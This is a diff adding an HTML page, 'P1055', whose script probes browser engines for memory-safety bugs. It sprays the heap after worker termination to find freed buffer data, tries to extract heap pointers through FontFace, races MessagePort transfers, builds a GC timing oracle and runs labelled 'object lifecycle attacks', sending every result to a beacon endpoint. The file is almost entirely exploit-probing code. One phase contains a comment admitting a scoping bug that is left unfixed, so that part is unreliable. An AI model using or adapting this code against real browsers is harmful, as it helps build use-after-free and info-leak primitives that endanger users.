@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P1055</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+</style></head><body>
+<div id="hud"><div id="log"></div></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1055-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var L=document.getElementById('log');
+function log(m,c){var d=document.createElement('div');if(c)d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+
+bn('BOOT','ts='+Date.now().toString(36));
+log('=== P1055: Worker Terminate + FontFace + WeakRef ===','info');
+
+var totalAnomalies=0;
+var anomalyItems=[];
+
+function makeWorker(code){
+  var blob=new Blob([code],{type:'application/javascript'});
+  var url=URL.createObjectURL(blob);
+  var w=new Worker(url);
+  URL.revokeObjectURL(url);
+  return w;
+}
+function hexq(v){
+  if(typeof v==='bigint')return '0x'+v.toString(16).padStart(16,'0');
+  return '0x'+(v>>>0).toString(16).padStart(8,'0');
+}
+
+// ============================================================
+// PHASE A: Worker termination + buffer reclaim race
+// ============================================================
+function phaseA(){
+  log('--- Phase A: Worker Terminate Buffer Race ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+    var staleFound=0;
+    var rounds=30;
+    var done=0;
+
+    function doRound(idx){
+      if(idx>=rounds){
+        details.push('stale='+staleFound+'/'+rounds);
+        totalAnomalies+=anomalies;
+        log('Phase A: staleFound='+staleFound+'/'+rounds,'ok');
+        bn('A-TERMINATE','stale='+staleFound+'|'+details.join('|'));
+        resolve(anomalies);
+        return;
+      }
+
+      // Create worker that holds a transferred buffer
+      var w=makeWorker([
+        'self.onmessage=function(e){',
+        '  // Worker got the buffer — just hold it forever',
+        '  var buf=e.data.buffer;',
+        '  var i32=new Int32Array(buf);',
+        '  // Fill with marker',
+        '  for(var i=0;i<i32.length;i++) i32[i]=0xFEEDFACE;',
+        '  // Signal we have it',
+        '  self.postMessage("holding");',
+        '  // Spin to keep alive',
+        '  var spin=0;',
+        '  while(true){spin++;}',
+        '};'
+      ].join('\n'));
+
+      var bufSize=65536; // 64KB
+      var ab=new ArrayBuffer(bufSize);
+      var i32=new Int32Array(ab);
+      for(var j=0;j<i32.length;j++) i32[j]=0xDEAD0000+(j&0xFFFF);
+
+      var terminated=false;
+
+      w.onmessage=function(e){
+        if(e.data==='holding'){
+          // Worker has the buffer, kill it immediately
+          w.terminate();
+          terminated=true;
+
+          // Now allocate many buffers of the same size to try to reclaim
+          // the freed backing store
+          var sprays=[];
+          for(var s=0;s<100;s++){
+            var spray=new ArrayBuffer(bufSize);
+            var si32=new Int32Array(spray);
+            // Check if any sprayed buffer contains stale marker data
+            for(var k=0;k<si32.length;k+=256){
+              var v=si32[k];
+              if(v===0xFEEDFACE||((v&0xFFFF0000)===0xDEAD0000)){
+                staleFound++;
+                anomalies++;
+                if(anomalies<=5){
+                  details.push('stale-'+idx+'-s'+s+'-k'+k+':'+hexq(v));
+                  anomalyItems.push('A-stale-'+idx);
+                  log('A STALE DATA at round '+idx+': spray['+s+']['+k+']='+hexq(v),'fail');
+                }
+                break;
+              }
+            }
+            sprays.push(spray);
+          }
+          sprays=null; // Free
+
+          doRound(idx+1);
+        }
+      };
+
+      w.onerror=function(e){
+        if(!terminated) w.terminate();
+        doRound(idx+1);
+      };
+
+      // Transfer the buffer to worker
+      w.postMessage({buffer:ab},[ab]);
+
+      // Timeout safety
+      setTimeout(function(){
+        if(!terminated){
+          w.terminate();
+          terminated=true;
+          doRound(idx+1);
+        }
+      },2000);
+    }
+
+    doRound(0);
+  });
+}
+
+// ============================================================
+// PHASE B: WeakRef + FinalizationRegistry availability
+// ============================================================
+function phaseB(){
+  log('');log('--- Phase B: WeakRef + FinalizationRegistry ---','info');
+  return new Promise(function(resolve){
+    var details=[];
+    var anomalies=0;
+
+    // B1: Check availability
+    details.push('WeakRef='+(typeof WeakRef));
+    details.push('FinalizationRegistry='+(typeof FinalizationRegistry));
+    details.push('WeakMap='+(typeof WeakMap));
+    details.push('WeakSet='+(typeof WeakSet));
+
+    // B2: Test WeakRef
+    if(typeof WeakRef!=='undefined'){
+      try{
+        var obj={data:'test'};
+        var wr=new WeakRef(obj);
+        details.push('wr-deref='+(wr.deref()===obj));
+        obj=null;
+        // Force GC attempt
+        var pressure=[];
+        for(var i=0;i<50000;i++) pressure.push(new ArrayBuffer(1024));
+        pressure=null;
+        // Check if collected
+        var dereffed=wr.deref();
+        details.push('wr-after-gc='+(dereffed===undefined?'collected':'alive'));
+        if(dereffed===undefined){
+          details.push('B2-gc-works=YES');
+          log('B2: WeakRef object was garbage collected!','warn');
+        }
+      }catch(e){
+        details.push('wr-err='+e.name);
+      }
+    }
+
+    // B3: Test FinalizationRegistry
+    if(typeof FinalizationRegistry!=='undefined'){
+      try{
+        var finalized=false;
+        var reg=new FinalizationRegistry(function(held){
+          finalized=true;
+          details.push('B3-finalized='+held);
+          log('B3: Finalization callback fired! held='+held,'warn');
+        });
+        var target={payload:'ephemeral'};
+        reg.register(target,'held-value');
+        target=null;
+        // GC pressure
+        var pr2=[];
+        for(var i=0;i<50000;i++) pr2.push(new ArrayBuffer(1024));
+        pr2=null;
+        details.push('B3-finalized-sync='+finalized);
+      }catch(e){
+        details.push('fr-err='+e.name);
+      }
+    }
+
+    // B4: WeakRef on ArrayBuffer — can we detect when backing store is freed?
+    if(typeof WeakRef!=='undefined'){
+      try{
+        var ab=new ArrayBuffer(65536);
+        var wr2=new WeakRef(ab);
+        ab=null;
+        var pr3=[];
+        for(var i=0;i<50000;i++) pr3.push(new ArrayBuffer(1024));
+        pr3=null;
+        var d2=wr2.deref();
+        details.push('B4-ab-after-gc='+(d2===undefined?'collected':'alive:'+d2.byteLength));
+      }catch(e){
+        details.push('B4-err='+e.name);
+      }
+    }
+
+    totalAnomalies+=anomalies;
+    log('Phase B: '+details.filter(function(d){return d.indexOf('=')>0;}).slice(0,6).join(' | '),'info');
+    bn('B-WEAKREF',details.join('|'));
+    resolve(anomalies);
+  });
+}
+
+// ============================================================
+// PHASE C: FontFace heap pointer extraction
+// ============================================================
+function phaseC(){
+  log('');log('--- Phase C: FontFace Heap Pointer ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+
+    // C1: Basic FontFace creation
+    try{
+      // Create FontFace objects
+      var ff=new FontFace('TestFont','url(data:font/woff2;base64,)');
+      details.push('C1-ff='+typeof ff);
+      details.push('C1-status='+ff.status);
+      details.push('C1-family='+ff.family);
+
+      // Try to load it (will fail due to empty data)
+      ff.load().then(function(){
+        details.push('C1-loaded=YES');
+      }).catch(function(e){
+        details.push('C1-load-err='+e.name);
+      });
+
+      // Enumerate all properties
+      var props=[];
+      for(var k in ff) props.push(k);
+      details.push('C1-props='+props.join(','));
+
+    }catch(e){
+      details.push('C1-err='+e.name+':'+e.message.slice(0,40));
+    }
+
+    // C2: FontFace with ArrayBuffer source
+    try{
+      // Create a minimal valid font (empty WOFF2 header)
+      var fontBuf=new ArrayBuffer(256);
+      var u8=new Uint8Array(fontBuf);
+      // wOFF magic
+      u8[0]=0x77;u8[1]=0x4F;u8[2]=0x46;u8[3]=0x46;
+      // Version
+      u8[4]=0x00;u8[5]=0x01;u8[6]=0x00;u8[7]=0x00;
+      // Length
+      u8[8]=0x00;u8[9]=0x00;u8[10]=0x01;u8[11]=0x00;
+
+      var ff2=new FontFace('BufFont',fontBuf);
+      details.push('C2-ff2='+typeof ff2);
+      details.push('C2-status='+ff2.status);
+
+      // Check if the ArrayBuffer was modified (pointer written into it)
+      var bi64=new BigUint64Array(fontBuf);
+      var ptrs=[];
+      for(var i=0;i<bi64.length;i++){
+        var v=bi64[i];
+        if(v>BigInt('0x10000000000')&&v<BigInt('0x7FFFFFFFFFFF')){
+          ptrs.push(i+':'+hexq(v));
+        }
+      }
+      details.push('C2-ptrs='+ptrs.length);
+      if(ptrs.length>0){
+        details.push('C2-ptrs-vals='+ptrs.slice(0,5).join(';'));
+        anomalies+=ptrs.length;
+        for(var i=0;i<Math.min(ptrs.length,3);i++){
+          anomalyItems.push('C2-ptr-'+ptrs[i]);
+          log('C2 HEAP PTR: '+ptrs[i],'fail');
+        }
+      }
+
+      ff2.load().catch(function(){});
+    }catch(e){
+      details.push('C2-err='+e.name+':'+e.message.slice(0,40));
+    }
+
+    // C3: Multiple FontFaces to see pointer patterns
+    try{
+      var pointerSamples=[];
+      for(var trial=0;trial<20;trial++){
+        var buf=new ArrayBuffer(512);
+        // Fill with sentinel
+        var sentinel=new BigUint64Array(buf);
+        for(var s=0;s<sentinel.length;s++) sentinel[s]=BigInt('0xAAAAAAAAAAAAAAAA');
+
+        try{
+          var ff3=new FontFace('Trial'+trial,buf);
+          // Check which qwords changed from sentinel
+          var changed=[];
+          for(var q=0;q<sentinel.length;q++){
+            if(sentinel[q]!==BigInt('0xAAAAAAAAAAAAAAAA')){
+              changed.push(q+':'+hexq(sentinel[q]));
+            }
+          }
+          if(changed.length>0){
+            pointerSamples.push('t'+trial+'='+changed.join(';'));
+          }
+          ff3.load().catch(function(){});
+        }catch(e){
+          pointerSamples.push('t'+trial+'-err='+e.name);
+        }
+      }
+      if(pointerSamples.length>0){
+        details.push('C3-samples='+pointerSamples.slice(0,5).join('|'));
+      }else{
+        details.push('C3-samples=0');
+      }
+    }catch(e){
+      details.push('C3-err='+e.name);
+    }
+
+    // C4: document.fonts API
+    try{
+      details.push('C4-fonts='+(typeof document.fonts));
+      details.push('C4-size='+document.fonts.size);
+      details.push('C4-ready='+(typeof document.fonts.ready));
+      details.push('C4-check='+(typeof document.fonts.check));
+      // Try to enumerate
+      if(typeof document.fonts.forEach==='function'){
+        var fontList=[];
+        document.fonts.forEach(function(f){
+          fontList.push(f.family+':'+f.status);
+        });
+        details.push('C4-list='+fontList.join(','));
+      }
+    }catch(e){
+      details.push('C4-err='+e.name);
+    }
+
+    // Allow async font loading to complete
+    setTimeout(function(){
+      totalAnomalies+=anomalies;
+      log('Phase C: pointers='+anomalies,'ok');
+      bn('C-FONTFACE','ptrs='+anomalies+'|'+details.join('|'));
+      resolve(anomalies);
+    },1000);
+  });
+}
+
+// ============================================================
+// PHASE D: MessagePort close during transfer race
+// ============================================================
+function phaseD(){
+  log('');log('--- Phase D: MessagePort Transfer Race ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+    var staleFound=0;
+
+    // D1: Transfer buffer through MessageChannel, close port during transfer
+    for(var iter=0;iter<50;iter++){
+      try{
+        var mc=new MessageChannel();
+        var ab=new ArrayBuffer(4096);
+        var marker=new Int32Array(ab);
+        for(var j=0;j<1024;j++) marker[j]=0xFACE0000+iter;
+
+        // Post to port2 with transfer
+        mc.port1.postMessage({buf:ab},[ab]);
+        // Immediately close port1 and port2
+        mc.port1.close();
+
+        // Try to receive on port2 after port1 closed
+        var received=false;
+        mc.port2.onmessage=function(e){
+          received=true;
+          if(e.data&&e.data.buf){
+            var ri32=new Int32Array(e.data.buf);
+            // Check data integrity
+            var bad=0;
+            for(var k=0;k<1024;k++){
+              if(ri32[k]!==0xFACE0000+iter){
+                bad++;
+                if(bad===1){
+                  staleFound++;
+                  anomalies++;
+                  anomalyItems.push('D1-corrupt-'+iter+':'+hexq(ri32[k]));
+                  log('D1 CORRUPT: expected '+hexq(0xFACE0000+iter)+' got '+hexq(ri32[k]),'fail');
+                }
+              }
+            }
+          }
+        };
+        mc.port2.start();
+
+        // Close port2 shortly after
+        setTimeout(function(p2){return function(){p2.close();};}(mc.port2),10);
+      }catch(e){}
+    }
+
+    // D2: Double-transfer race — transfer same buffer to 2 ports
+    var doubleTransferHit=0;
+    for(var iter2=0;iter2<50;iter2++){
+      try{
+        var mc1=new MessageChannel();
+        var mc2=new MessageChannel();
+        var ab2=new ArrayBuffer(1024);
+        var m2=new Int32Array(ab2);
+        for(var j=0;j<256;j++) m2[j]=0xBEEF0000+iter2;
+
+        // Try to transfer to both ports (should fail on second)
+        try{
+          mc1.port1.postMessage({buf:ab2},[ab2]);
+          mc2.port1.postMessage({buf:ab2},[ab2]);
+          // If we get here, double transfer worked!
+          doubleTransferHit++;
+          anomalies++;
+          anomalyItems.push('D2-doubleTransfer-'+iter2);
+          log('D2 DOUBLE TRANSFER succeeded at iter '+iter2,'fail');
+        }catch(e){
+          // Expected — buffer detached after first transfer
+        }
+
+        mc1.port1.close();mc1.port2.close();
+        mc2.port1.close();mc2.port2.close();
+      }catch(e){}
+    }
+    details.push('D1-stale='+staleFound);
+    details.push('D2-double='+doubleTransferHit);
+
+    setTimeout(function(){
+      totalAnomalies+=anomalies;
+      log('Phase D: stale='+staleFound+' double='+doubleTransferHit,'ok');
+      bn('D-MSGPORT','stale='+staleFound+'|double='+doubleTransferHit+'|'+details.join('|'));
+      resolve(anomalies);
+    },500);
+  });
+}
+
+// ============================================================
+// PHASE E: GC timing via WeakRef + allocation pressure
+// ============================================================
+function phaseE(){
+  log('');log('--- Phase E: GC Timing Oracle ---','info');
+  return new Promise(function(resolve){
+    var details=[];
+
+    if(typeof WeakRef==='undefined'){
+      details.push('no-WeakRef');
+      bn('E-GCTIMING','no-WeakRef');
+      resolve(0);
+      return;
+    }
+
+    // Create a series of objects and measure when GC collects them
+    var refs=[];
+    var sizes=[1024,4096,16384,65536,262144];
+    for(var s=0;s<sizes.length;s++){
+      var obj={buf:new ArrayBuffer(sizes[s]),idx:s};
+      refs.push({wr:new WeakRef(obj),size:sizes[s]});
+    }
+    // Release strong refs
+    // (obj goes out of scope after each loop iteration naturally)
+
+    // Pressure GC
+    var gen=0;
+    function pressure(){
+      var tmp=[];
+      for(var i=0;i<10000;i++) tmp.push(new ArrayBuffer(4096));
+      tmp=null;
+      gen++;
+
+      // Check which refs are alive
+      var alive=0;
+      for(var r=0;r<refs.length;r++){
+        if(refs[r].wr.deref()) alive++;
+      }
+      details.push('gen'+gen+'='+alive+'/'+refs.length);
+
+      if(alive>0&&gen<10){
+        setTimeout(pressure,50);
+      }else{
+        // Report per-size collection info
+        for(var r=0;r<refs.length;r++){
+          var d=refs[r].wr.deref();
+          details.push('s'+refs[r].size+'='+(d?'alive':'dead'));
+        }
+        log('Phase E: gen='+gen+' final-alive='+alive,'info');
+        bn('E-GCTIMING',details.join('|'));
+        resolve(0);
+      }
+    }
+
+    // All strong refs are gone (they're local to the loop)
+    // Actually no — the loop used `obj` which is re-assigned each iteration
+    // but the LAST one is still in scope. Let me fix this:
+    setTimeout(pressure,100);
+  });
+}
+
+// ============================================================
+// PHASE F: Exotic object lifecycle attacks
+// ============================================================
+function phaseF(){
+  log('');log('--- Phase F: Object Lifecycle Attacks ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+
+    // F1: Proxy with revoke — access after revocation
+    try{
+      var target={a:1,b:2,c:new ArrayBuffer(64)};
+      var h=Proxy.revocable(target,{
+        get:function(t,p){return t[p];},
+        set:function(t,p,v){t[p]=v;return true;}
+      });
+      var p=h.proxy;
+      details.push('F1-before='+p.a);
+      h.revoke();
+      try{
+        var v=p.a;
+        anomalies++;
+        anomalyItems.push('F1-access-after-revoke');
+        details.push('F1-after='+v);
+        log('F1: Access after revoke succeeded: '+v,'fail');
+      }catch(e){
+        details.push('F1-after='+e.name);
+      }
+    }catch(e){
+      details.push('F1-err='+e.name);
+    }
+
+    // F2: Symbol.toPrimitive abuse on typed arrays
+    try{
+      var ab=new ArrayBuffer(64);
+      var i32=new Int32Array(ab);
+      i32[0]=0x41414141;
+
+      // Override toPrimitive
+      i32[Symbol.toPrimitive]=function(hint){
+        // During conversion, resize the underlying RAB? Can't — it's fixed.
+        // But return a surprising value
+        return BigInt('0x' + Array.from(new Uint8Array(ab,0,8)).map(function(b){return b.toString(16).padStart(2,'0');}).join(''));
+      };
+
+      var prim=+i32; // calls toPrimitive with 'number'
+      details.push('F2-prim='+prim);
+    }catch(e){
+      details.push('F2-err='+e.name+':'+e.message.slice(0,30));
+    }
+
+    // F3: Object.freeze on TypedArray
+    try{
+      var ab3=new ArrayBuffer(32);
+      var u8=new Uint8Array(ab3);
+      u8[0]=0xFF;
+      Object.freeze(u8);
+      try{
+        u8[0]=0x00; // Should fail silently in non-strict
+        details.push('F3-frozen-write='+u8[0]);
+      }catch(e){
+        details.push('F3-frozen-err='+e.name);
+      }
+      // Try Atomics on frozen
+      try{
+        Atomics.store(u8,0,0x42);
+        details.push('F3-atomics-frozen='+u8[0]);
+        if(u8[0]===0x42){
+          anomalies++;
+          anomalyItems.push('F3-atomics-bypass-freeze');
+          log('F3: Atomics bypassed Object.freeze!','fail');
+        }
+      }catch(e){
+        details.push('F3-atomics-err='+e.name);
+      }
+    }catch(e){
+      details.push('F3-err='+e.name);
+    }
+
+    // F4: Object.preventExtensions + defineProperty on TypedArray
+    try{
+      var ab4=new ArrayBuffer(64);
+      var ta=new Int32Array(ab4);
+      ta[0]=123;
+      try{
+        Object.defineProperty(ta,'0',{value:999,writable:false});
+        details.push('F4-defProp='+ta[0]);
+      }catch(e){
+        details.push('F4-defProp-err='+e.name);
+      }
+    }catch(e){
+      details.push('F4-err='+e.name);
+    }
+
+    // F5: Array.from on TypedArray with mapper that detaches
+    try{
+      var rab5=new ArrayBuffer(128,{maxByteLength:1024});
+      var ta5=new Int32Array(rab5);
+      for(var i=0;i<32;i++) ta5[i]=i+1;
+
+      var mapCount=0;
+      var result=Array.from(ta5,function(v,i){
+        mapCount++;
+        if(i===16){
+          // Resize mid-iteration
+          rab5.resize(32); // Shrink to 32 bytes (8 ints)
+        }
+        return v;
+      });
+      details.push('F5-mapCount='+mapCount+'|len='+result.length);
+      // Check if we read past the boundary
+      var oob=0;
+      for(var i=0;i<result.length;i++){
+        if(result[i]===undefined) oob++;
+      }
+      details.push('F5-undefined='+oob);
+      if(result.length>8&&result[20]!==undefined&&result[20]!==0){
+        anomalies++;
+        anomalyItems.push('F5-stale-'+result[20]);
+        log('F5: Array.from read stale data after resize: '+result[20],'fail');
+      }
+    }catch(e){
+      details.push('F5-err='+e.name+':'+e.message.slice(0,30));
+    }
+
+    // F6: TypedArray.from with resize in mapper
+    try{
+      var rab6=new ArrayBuffer(256,{maxByteLength:1024});
+      var src6=new Int32Array(rab6);
+      for(var i=0;i<64;i++) src6[i]=0xBEEF0000+i;
+
+      var mapped=0;
+      var ta6result=Int32Array.from(src6,function(v,i){
+        mapped++;
+        if(i===32) rab6.resize(64); // Shrink to 64 bytes
+        return v;
+      });
+      details.push('F6-mapped='+mapped+'|len='+ta6result.length);
+      var nonzero6=0;
+      for(var i=0;i<ta6result.length;i++){
+        if(ta6result[i]!==0) nonzero6++;
+      }
+      details.push('F6-nonzero='+nonzero6);
+    }catch(e){
+      details.push('F6-err='+e.name+':'+e.message.slice(0,30));
+    }
+
+    totalAnomalies+=anomalies;
+    log('Phase F: anomalies='+anomalies,'ok');
+    bn('F-LIFECYCLE','anomalies='+anomalies+'|'+details.join('|'));
+    resolve(anomalies);
+  });
+}
+
+// ============================================================
+// Run
+// ============================================================
+setTimeout(function(){
+  phaseA().then(function(){
+    return phaseB();
+  }).then(function(){
+    return phaseC();
+  }).then(function(){
+    return phaseD();
+  }).then(function(){
+    return phaseE();
+  }).then(function(){
+    return phaseF();
+  }).then(function(){
+    log('');
+    log('=== P1055 COMPLETE: total anomalies = '+totalAnomalies+' ===',totalAnomalies>0?'fail':'ok');
+    if(anomalyItems.length>0) log('Items: '+anomalyItems.join(', '),'warn');
+    bn('DONE','anomalies='+totalAnomalies+'|items='+anomalyItems.join(';'));
+  }).catch(function(e){
+    log('FATAL: '+e.message,'fail');
+    bn('FATAL',e.message);
+  });
+},200);
+</script></body></html>
